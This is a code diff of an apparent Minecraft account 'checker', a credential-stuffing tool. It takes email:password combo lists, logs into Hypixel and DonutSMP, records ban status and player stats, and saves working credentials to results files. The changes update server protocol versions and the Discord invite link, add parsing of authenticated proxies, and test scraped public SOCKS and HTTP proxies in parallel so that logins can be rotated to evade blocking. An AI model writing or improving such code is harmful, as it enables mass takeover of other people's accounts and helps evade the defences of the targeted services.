@@ -304,7 +304,7 @@ class Capture:
                     "embeds": [{
                         "author": {
                             "name": "Nexus V2 MC Checker",
-                            "url": "https://discord.gg/gAJNpjHw4a",
+                            "url": "https://discord.gg/UfzDQ8a7k7",
                             "icon_url": "https://ik.imagekit.io/nexusv2/NEXUS.png"
                         },
                         
@@ -772,7 +772,7 @@ class Capture:
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
             tries = 0
             while tries < maxretries:
-                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
+                connection = Connection("mc.hypixel.net", 25565, auth_token=auth_token, initial_version=766, allowed_versions={763, 764, 765, 766})
                 @connection.listener(clientbound.login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
                     data = json.loads(str(packet.json_data))
@@ -809,7 +809,7 @@ class Capture:
                 try:
                     # Set a short default socket timeout to avoid hanging on bad proxies
                     original_timeout = socket.getdefaulttimeout()
-                    socket.setdefaulttimeout(8)
+                    socket.setdefaulttimeout(15)
                     if len(banproxies) > 0:
                         proxy = random.choice(banproxies)
                         if '@' in proxy:
@@ -856,8 +856,10 @@ class Capture:
             chat_messages = []
             auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
+            connection = None
+            original_timeout = socket.getdefaulttimeout()
             try:
-                connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})
+                connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=766, allowed_versions={763, 764, 765, 766})
 
                 @connection.listener(clientbound.login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
@@ -873,8 +875,7 @@ class Capture:
                 def joined_server(packet):
                     nonlocal result
                     result = "unbanned"
-                
-                # Listen for chat messages to extract stats
+
                 @connection.listener(clientbound.play.ChatMessagePacket)
                 def chat_message(packet):
                     nonlocal chat_messages
@@ -884,155 +885,112 @@ class Capture:
                     except Exception:
                         pass
 
+                socket.setdefaulttimeout(10)
                 connection.connect()
                 c = 0
-                # Wait for connection result
                 while result is None and c < 1000:
                     time.sleep(0.01)
                     c += 1
-                
-                # After joining, wait for welcome/automatic messages from server
+
                 if result == "unbanned":
-                    if screen == "'2'": print(Fore.CYAN + f"[DEBUG] Joined DonutSMP, waiting for server messages..." + Style.RESET_ALL)
-                    
-                    # Method 1: Wait longer for automatic stats (many servers send stats on join)
-                    # Most servers send welcome messages, MOTD, and sometimes stats automatically
-                    time.sleep(5)  # Wait 5 seconds for server to send messages
-                    
-                    # Method 2: Check for stats API or website
-                    # Many servers have stats websites like stats.donutsmp.net
+                    if screen == "'2'":
+                        print(Fore.CYAN + f"[DEBUG] Joined DonutSMP, waiting for server messages..." + Style.RESET_ALL)
+                    time.sleep(5)
+
                     try:
-                        # Try common stat website patterns
                         stat_urls = [
                             f"https://stats.donutsmp.net/player/{self.name}",
                             f"https://donutsmp.net/stats/{self.name}",
                             f"https://api.donutsmp.net/stats/{self.name}",
                             f"https://www.donutsmp.net/player/{self.name}"
                         ]
-                        
                         for url in stat_urls:
                             try:
                                 stat_response = requests.get(url, timeout=3, verify=False)
                                 if stat_response.status_code == 200 and len(stat_response.text) > 100:
-                                    if screen == "'2'": print(Fore.GREEN + f"[DEBUG] Found stats website: {url}" + Style.RESET_ALL)
-                                    # Parse stats from website
+                                    if screen == "'2'":
+                                        print(Fore.GREEN + f"[DEBUG] Found stats website: {url}" + Style.RESET_ALL)
                                     stat_text = stat_response.text
-                                    
-                                    # Extract common stats patterns
                                     money_match = re.search(r'(?:money|balance|coins?)\D*([\d,]+)', stat_text, re.IGNORECASE)
                                     if money_match:
                                         self.donut_money = f"${money_match.group(1)}"
-                                    
                                     playtime_match = re.search(r'(?:playtime|time played)\D*([\d]+\s*(?:hours?|days?|minutes?)(?:\s*[\d]+\s*(?:hours?|minutes?))?)', stat_text, re.IGNORECASE)
                                     if playtime_match:
                                         self.donut_playtime = playtime_match.group(1)
-                                    
                                     kills_match = re.search(r'kills?\D*([\d,]+)', stat_text, re.IGNORECASE)
                                     if kills_match:
                                         self.donut_kills = kills_match.group(1)
-                                    
                                     deaths_match = re.search(r'deaths?\D*([\d,]+)', stat_text, re.IGNORECASE)
                                     if deaths_match:
                                         self.donut_deaths = deaths_match.group(1)
-                                    
                                     break
                             except:
                                 continue
-                    except Exception as e:
-                        if screen == "'2'": print(Fore.YELLOW + f"[DEBUG] No stats website found" + Style.RESET_ALL)
+                    except Exception:
+                        if screen == "'2'":
+                            print(Fore.YELLOW + f"[DEBUG] No stats website found" + Style.RESET_ALL)
 
                 if result == "unbanned":
                     self.donut_status = "unbanned"
                     donut_unbanned += 1
-                    
-                    # Debug: Show received messages
                     if screen == "'2'":
                         print(Fore.CYAN + f"[DEBUG] Received {len(chat_messages)} chat messages from DonutSMP" + Style.RESET_ALL)
                         if chat_messages:
                             print(Fore.CYAN + f"[DEBUG] First 3 messages: {chat_messages[:3]}" + Style.RESET_ALL)
-                    
-                    # Extract DonutSMP stats from chat messages
                     all_messages = ' '.join(chat_messages)
                     clean = re.sub(r'§.', '', all_messages)
-                    
                     if screen == "'2'" and clean:
                         print(Fore.CYAN + f"[DEBUG] Cleaned text preview: {clean[:200]}" + Style.RESET_ALL)
-                    
-                    # Money extraction
                     money_match = re.search(r'(?:Money|Balance|Coins?):\s*\$?([0-9,]+)', clean, re.IGNORECASE)
                     self.donut_money = f"${money_match.group(1)}" if money_match else None
-                    
-                    # Playtime extraction (multiple formats)
                     playtime_match = re.search(r'(?:Playtime|Time Played|Play Time):\s*([^\n\\,]+)', clean, re.IGNORECASE)
                     self.donut_playtime = playtime_match.group(1).strip() if playtime_match else None
-                    
-                    # Shards extraction
                     shards_match = re.search(r'(?:Donut )?Shards?:\s*([0-9,]+)', clean, re.IGNORECASE)
                     self.donut_shards = shards_match.group(1) if shards_match else None
-                    
-                    # Additional DonutSMP stats
                     level_match = re.search(r'Level:\s*([0-9,]+)', clean, re.IGNORECASE)
                     self.donut_level = level_match.group(1) if level_match else None
-                    
                     rank_match = re.search(r'Rank:\s*([^\n\\,]+)', clean, re.IGNORECASE)
                     self.donut_rank = rank_match.group(1).strip() if rank_match else None
-                    
                     kills_match = re.search(r'Kills?:\s*([0-9,]+)', clean, re.IGNORECASE)
                     self.donut_kills = kills_match.group(1) if kills_match else None
-                    
                     deaths_match = re.search(r'Deaths?:\s*([0-9,]+)', clean, re.IGNORECASE)
                     self.donut_deaths = deaths_match.group(1) if deaths_match else None
-                    
-                    with open(f"results/{fname}/DonutUnbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                    with open(f"results/{fname}/DonutUnbanned.txt", 'a') as f:
+                        f.write(f"{self.email}:{self.password}\n")
                 elif result == "banned":
                     self.donut_status = "banned"
                     donut_banned += 1
                     if disconnect_message:
-                        # Debug: Print raw message if in log mode
                         if screen == "'2'":
                             print(Fore.CYAN + f"\n[DEBUG] DonutSMP Disconnect Message:\n{disconnect_message[:500]}" + Style.RESET_ALL)
-                        
                         clean = re.sub(r'§.', '', disconnect_message)
-                        
-                        # Extract all text parts from JSON
                         text_parts = re.findall(r'"text"\s*:\s*"([^"]+)"', disconnect_message)
                         if text_parts:
                             full_text = ' '.join(text_parts)
                             if screen == "'2'":
                                 print(Fore.CYAN + f"[DEBUG] Extracted text: {full_text[:200]}" + Style.RESET_ALL)
-                            
-                            # Clean and combine all text
                             clean_full = full_text.replace('\\n', '\n').replace('\\r', '')
-                            # Remove Minecraft color codes
                             clean_full = re.sub(r'[§&$][0-9a-fk-or]', '', clean_full, flags=re.IGNORECASE)
-                            # Remove Discord links
                             clean_full = re.sub(r'(?:https?://)?(?:www\.)?discord\.gg/\S+', '', clean_full, flags=re.IGNORECASE)
-                            
-                            # Extract ban reason - look for text in brackets or before "Date:"
                             reason_match = re.search(r'\[([^\]]+)\]', clean_full)
                             if reason_match:
                                 self.donut_reason = reason_match.group(1).strip()
                             else:
-                                # Try to find ban reason (text containing "banned" or substantial text)
                                 ban_texts = [t.strip() for t in text_parts if len(t.strip()) > 10 and 'banned' in t.lower()]
                                 if ban_texts:
                                     reason = ban_texts[0]
                                     reason = reason.replace('\\n', ' ').replace('\\r', ' ').replace('\n', ' ').replace('\r', ' ')
                                     reason = re.sub(r'[§&$][0-9a-fk-or]', '', reason, flags=re.IGNORECASE)
                                     reason = re.sub(r'\s+', ' ', reason).strip()
-                                    # Remove Discord links more aggressively
                                     reason = re.sub(r'discord\.gg/\S*', '', reason, flags=re.IGNORECASE)
                                     reason = re.sub(r'(?:https?://)?(?:www\.)?discord\.[a-z]+/\S*', '', reason, flags=re.IGNORECASE)
                                     reason = re.split(r'(?:Time Left|Ban ID|Date|Expires)', reason, flags=re.IGNORECASE)[0].strip()
                                     self.donut_reason = reason[:150] if reason else "Banned"
                                 else:
-                                    # Use first substantial text as fallback
                                     substantial = [t.strip() for t in text_parts if len(t.strip()) > 10 and 'discord' not in t.lower()]
                                     if substantial:
                                         reason = substantial[0].replace('\\n', ' ').replace('\\r', ' ').replace('\n', ' ').replace('\r', ' ')
-                                        # Remove Minecraft color codes
                                         reason = re.sub(r'[§&$][0-9a-fk-or]', '', reason, flags=re.IGNORECASE)
-                                        # Remove Discord links
                                         reason = re.sub(r'discord\.gg/\S*', '', reason, flags=re.IGNORECASE)
                                         reason = re.sub(r'(?:https?://)?(?:www\.)?\S+\.(?:com|net|org|gg)/\S+', '', reason, flags=re.IGNORECASE)
                                         self.donut_reason = re.sub(r'\s+', ' ', reason).strip()[:150]
@@ -1040,13 +998,10 @@ class Capture:
                                         self.donut_reason = "Banned"
                         else:
                             self.donut_reason = "Banned"
-                        
-                        # Extract date if available
                         date_match = re.search(r'Date:\s*([0-9/]+)', disconnect_message, re.IGNORECASE)
                         if date_match:
                             self.donut_time = f"Banned on {date_match.group(1)}"
                         else:
-                            # Extract time left with better pattern
                             time_match = re.search(r'Time Left:\s*([^\\]+?)(?:Ban ID|$)', disconnect_message, re.IGNORECASE)
                             if time_match:
                                 time_str = time_match.group(1).strip()
@@ -1054,18 +1009,14 @@ class Capture:
                                 time_str = re.sub(r'[\\\[\]{}"\']', '', time_str).strip()
                                 self.donut_time = time_str if time_str else ""
                             else:
-                                # Try to find time-like patterns
                                 time_pattern = re.search(r'(\d+\s*(?:day|hour|minute|week|month|year)s?(?:\s+\d+\s*(?:day|hour|minute|week|month|year)s?)*|permanent|forever)', disconnect_message, re.IGNORECASE)
                                 self.donut_time = time_pattern.group(1) if time_pattern else ""
-                        
-                        # Extract ban ID - look for # followed by alphanumeric
                         banid_match = re.search(r'(?:Ban ID|ID)\s*:\s*[§&$]?[0-9a-fk-or]?(#?[A-Za-z0-9]+)', disconnect_message, re.IGNORECASE)
                         self.donut_banid = banid_match.group(1).strip() if banid_match else ""
                     else:
                         self.donut_reason = "Banned (no details provided)"
-                    with open(f"results/{fname}/DonutBanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-
-                    # Attempt to fetch public stats even when banned
+                    with open(f"results/{fname}/DonutBanned.txt", 'a') as f:
+                        f.write(f"{self.email}:{self.password}\n")
                     try:
                         stat_urls = [
                             f"https://stats.donutsmp.net/player/{self.name}",
@@ -1077,24 +1028,39 @@ class Capture:
                             try:
                                 stat_response = requests.get(url, timeout=3, verify=False)
                                 if stat_response.status_code == 200 and len(stat_response.text) > 100:
-                                    if screen == "'2'": print(Fore.GREEN + f"[DEBUG] (Banned) Found stats website: {url}" + Style.RESET_ALL)
+                                    if screen == "'2'":
+                                        print(Fore.GREEN + f"[DEBUG] (Banned) Found stats website: {url}" + Style.RESET_ALL)
                                     stat_text = stat_response.text
                                     money_match = re.search(r'(?:money|balance|coins?)\D*([\d,]+)', stat_text, re.IGNORECASE)
-                                    if money_match: self.donut_money = f"${money_match.group(1)}"
+                                    if money_match:
+                                        self.donut_money = f"${money_match.group(1)}"
                                     playtime_match = re.search(r'(?:playtime|time played)\D*([\d]+\s*(?:hours?|days?|minutes?)(?:\s*[\d]+\s*(?:hours?|minutes?))?)', stat_text, re.IGNORECASE)
-                                    if playtime_match: self.donut_playtime = playtime_match.group(1)
+                                    if playtime_match:
+                                        self.donut_playtime = playtime_match.group(1)
                                     kills_match = re.search(r'kills?\D*([\d,]+)', stat_text, re.IGNORECASE)
-                                    if kills_match: self.donut_kills = kills_match.group(1)
+                                    if kills_match:
+                                        self.donut_kills = kills_match.group(1)
                                     deaths_match = re.search(r'deaths?\D*([\d,]+)', stat_text, re.IGNORECASE)
-                                    if deaths_match: self.donut_deaths = deaths_match.group(1)
+                                    if deaths_match:
+                                        self.donut_deaths = deaths_match.group(1)
                                     break
                             except:
                                 continue
                     except Exception:
                         pass
-                connection.disconnect()
             except Exception as e:
-                pass
+                if screen == "'2'":
+                    print(Fore.YELLOW + f"[DEBUG] DonutSMP connection error: {e}" + Style.RESET_ALL)
+            finally:
+                try:
+                    if connection:
+                        connection.disconnect()
+                except:
+                    pass
+                socket.setdefaulttimeout(original_timeout)
+
+            if self.donut_status is None:
+                self.donut_status = "Unable to check"
 
     def payment_check(self):
         # Payment check is now disabled by default for better CPM - can enable in config.ini
@@ -1577,7 +1543,21 @@ def validmail(email, password):
     if screen == "'2'": print(Fore.LIGHTMAGENTA_EX + f"📬 Valid Mail: {email}:{password}" + Style.RESET_ALL)
 
 def getproxy():
-    if proxytype == "'5'": 
+    def build_proxy_url(proto, proxy_str):
+        parts = proxy_str.strip().split(':')
+        if len(parts) >= 4:
+            host = parts[0]
+            port = parts[1]
+            username = parts[2]
+            password = ':'.join(parts[3:])
+            auth = f"{username}:{password}@"
+        else:
+            host = parts[0]
+            port = parts[1] if len(parts) > 1 else ''
+            auth = ''
+        return f"{proto}{auth}{host}:{port}"
+
+    if proxytype == "'5'":
         # Auto scraper - force proxyless if no proxies loaded
         if len(proxylist) == 0:
             return None
@@ -1585,11 +1565,18 @@ def getproxy():
     if proxytype != "'4'": 
         if len(proxylist) == 0:
             return None
-        proxy = random.choice(proxylist)
-        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
-        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
-        elif proxytype  == "'3'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
-    else: return None
+        proxy = random.choice(proxylist).strip()
+        if proxytype  == "'1'":
+            url = build_proxy_url('http://', proxy)
+            return {'http': url, 'https': url}
+        elif proxytype  == "'2'":
+            url = build_proxy_url('socks4://', proxy)
+            return {'http': url, 'https': url}
+        elif proxytype  == "'3'":
+            url = build_proxy_url('socks5://', proxy)
+            return {'http': url, 'https': url}
+    else:
+        return None
 
 def Checker(combo):
     global bad, checked, cpm
@@ -1717,18 +1704,19 @@ def get_ban_proxies():
     print(Fore.CYAN + Style.BRIGHT + "Auto-scraping SOCKS proxies for ban checking..." + Style.RESET_ALL)
     socks_proxies = []
     
-    # Premium SOCKS proxy sources for ban checking
+    # Premium SOCKS proxy sources for ban checking - Actively maintained & auto-updating
     socks_apis = [
         "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=10000&proxy_format=ipport&format=text",
         "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=10000&proxy_format=ipport&format=text",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
-        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/main/socks5.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/main/socks4.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
         "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
-        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
-        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt"
+        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
+        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5_proxies.txt",
+        "https://raw.githubusercontent.com/mmpx12/proxy-list/main/socks5.txt"
     ]
     
     try:
@@ -1765,94 +1753,82 @@ def get_ban_proxies():
         
         # Filter and deduplicate
         valid_socks = list(set([p.strip() for p in socks_proxies if is_valid_proxy(p.strip())]))
+        if not valid_socks:
+            print(Fore.YELLOW + Style.BRIGHT + "No valid SOCKS proxies scraped for ban checking." + Style.RESET_ALL)
+            return
+
+        print(Fore.CYAN + Style.BRIGHT + "Testing scraped SOCKS proxies for ban checking..." + Style.RESET_ALL)
+        tested_socks = test_proxy_speeds(valid_socks, "SOCKS5")
+
         banproxies.clear()
-        banproxies.extend(valid_socks)
-        
-        print(Fore.GREEN + Style.BRIGHT + f"Auto-scraped {len(banproxies)} SOCKS proxies for ban checking!" + Style.RESET_ALL)
+        banproxies.extend(tested_socks)
+
+        if len(banproxies) == 0 and valid_socks:
+            banproxies.extend(valid_socks[:50])
+            print(Fore.YELLOW + Style.BRIGHT + "No fast proxies passed validation; using first 50 valid SOCKS proxies as fallback." + Style.RESET_ALL)
+
+        print(Fore.GREEN + Style.BRIGHT + f"Auto-scraped and validated {len(banproxies)} SOCKS proxies for ban checking!" + Style.RESET_ALL)
         
     except Exception as e:
         print(Fore.RED + Style.BRIGHT + f"Error auto-scraping ban proxies: {str(e)}" + Style.RESET_ALL)
         print(Fore.YELLOW + "Falling back to main proxy pool for ban checking..." + Style.RESET_ALL)
 
 def test_proxy_speeds(proxy_list, proxy_type):
-    """Optimized proxy speed testing - fast and efficient"""
+    """Test ALL proxies in parallel with 100 threads - returns all fast & valid ones"""
     if not proxy_list or len(proxy_list) == 0:
         return proxy_list
     
-    # Smart sampling based on list size
-    if len(proxy_list) > 5000:
-        print(Fore.YELLOW + f"📊 Large {proxy_type} list ({len(proxy_list)}), using smart sampling..." + Style.RESET_ALL)
-        # Take every 100th proxy for massive lists
-        sample_proxies = proxy_list[::100][:10]
-    elif len(proxy_list) > 1000:
-        print(Fore.YELLOW + f"📊 Medium {proxy_type} list ({len(proxy_list)}), testing sample..." + Style.RESET_ALL)
-        # Take every 50th proxy for large lists
-        sample_proxies = proxy_list[::50][:15]
-    else:
-        print(Fore.YELLOW + f"📊 Testing {min(10, len(proxy_list))} {proxy_type} proxies..." + Style.RESET_ALL)
-        # Test up to 10 for smaller lists
-        sample_proxies = proxy_list[:10]
-    
+    print(Fore.CYAN + f"🔍 Testing ALL {len(proxy_list)} {proxy_type} proxies with 100 threads..." + Style.RESET_ALL)
     working_proxies = []
+    tested_count = [0]
+    lock = __import__('threading').Lock()
     
     def quick_test_proxy(proxy):
-        """Quick proxy test with very short timeout"""
+        """Test proxy with timeout"""
         try:
             if proxy_type == "HTTP":
                 proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-                test_url = 'http://httpbin.org/ip'
             else:  # SOCKS4/SOCKS5
                 if proxy_type == "SOCKS4":
                     proxy_dict = {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'}
                 else:
                     proxy_dict = {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
-                test_url = 'http://httpbin.org/ip'
             
             start_time = time.time()
-            response = requests.get(test_url, proxies=proxy_dict, timeout=2)  # Very short timeout
+            response = requests.get('http://httpbin.org/ip', proxies=proxy_dict, timeout=3, verify=False)
             speed = time.time() - start_time
             
-            if response.status_code == 200:
-                return (proxy, speed)
+            if response.status_code == 200 and speed < 10:
+                with lock:
+                    working_proxies.append((proxy, speed))
+                    tested_count[0] += 1
+                    if tested_count[0] % 50 == 0:
+                        print(Fore.CYAN + f"   Tested {tested_count[0]}/{len(proxy_list)} proxies, {len(working_proxies)} working..." + Style.RESET_ALL)
+                return True
         except:
             pass
-        return None
+        
+        with lock:
+            tested_count[0] += 1
+            if tested_count[0] % 50 == 0:
+                print(Fore.CYAN + f"   Tested {tested_count[0]}/{len(proxy_list)} proxies, {len(working_proxies)} working..." + Style.RESET_ALL)
+        return False
     
-    # Test proxies with progress indication
-    tested_count = 0
-    for proxy in sample_proxies:
-        tested_count += 1
-        if tested_count % 5 == 0:
-            print(Fore.CYAN + f"   Testing {proxy_type} proxy {tested_count}/{len(sample_proxies)}..." + Style.RESET_ALL)
-        
-        result = quick_test_proxy(proxy)
-        if result:
-            working_proxies.append(result)
-        
-        # Stop early if we have enough working proxies
-        if len(working_proxies) >= 5:
-            break
+    # Use thread pool to test all proxies in parallel with 100 threads
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        futures = [executor.submit(quick_test_proxy, proxy) for proxy in proxy_list]
+        concurrent.futures.wait(futures, timeout=300)
     
     if working_proxies:
-        # Sort by speed and get the fastest ones
+        # Sort by speed and return all working proxies sorted by speed
         working_proxies.sort(key=lambda x: x[1])
         fast_proxies = [proxy[0] for proxy in working_proxies]
         
-        print(Fore.GREEN + f"✅ Found {len(fast_proxies)} working {proxy_type} proxies" + Style.RESET_ALL)
-        
-        # Add more untested proxies to reach a good number
-        if len(fast_proxies) < 50:
-            remaining_needed = 50 - len(fast_proxies)
-            # Add proxies that weren't tested
-            untested_start = len(sample_proxies)
-            if untested_start < len(proxy_list):
-                additional_proxies = proxy_list[untested_start:untested_start + remaining_needed]
-                fast_proxies.extend(additional_proxies)
-        
+        print(Fore.GREEN + f"✅ Found {len(fast_proxies)} working & fast {proxy_type} proxies (tested {len(proxy_list)} total)" + Style.RESET_ALL)
         return fast_proxies
     else:
-        print(Fore.YELLOW + f"⚠️  No working {proxy_type} proxies found in sample, using first 50..." + Style.RESET_ALL)
-        return proxy_list[:50]  # Return first 50 if none work
+        print(Fore.YELLOW + f"⚠️  No working {proxy_type} proxies found after testing all {len(proxy_list)}, using first batch..." + Style.RESET_ALL)
+        return proxy_list[:100] if len(proxy_list) >= 100 else proxy_list
 
 def get_proxies():
     global proxylist, proxytype
@@ -1861,37 +1837,37 @@ def get_proxies():
     socks4 = []
     socks5 = []
     
-    # Enhanced HTTP Proxy APIs - Multiple high-quality sources
+    # Enhanced HTTP Proxy APIs - Multiple high-quality sources (actively maintained)
     api_http = [
         "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=10000&proxy_format=ipport&format=text",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/main/http.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
         "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
-        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"
+        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http_proxies.txt",
+        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt"
     ]
     
-    # Enhanced SOCKS4 Proxy APIs - More reliable sources
+    # Enhanced SOCKS4 Proxy APIs - More reliable sources (actively maintained)
     api_socks4 = [
         "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=10000&proxy_format=ipport&format=text",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
-        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/main/socks4.txt",
         "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
-        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt"
+        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4_proxies.txt",
+        "https://raw.githubusercontent.com/mmpx12/proxy-list/main/socks4.txt"
     ]
     
-    # Enhanced SOCKS5 Proxy APIs - Premium sources for ban checking
+    # Enhanced SOCKS5 Proxy APIs - Premium sources for ban checking (actively maintained)
     api_socks5 = [
         "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=10000&proxy_format=ipport&format=text",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
-        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/main/socks5.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
         "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
-        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
-        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt"
+        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5_proxies.txt",
+        "https://raw.githubusercontent.com/mmpx12/proxy-list/main/socks5.txt",
+        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt"
     ]
     
     try:
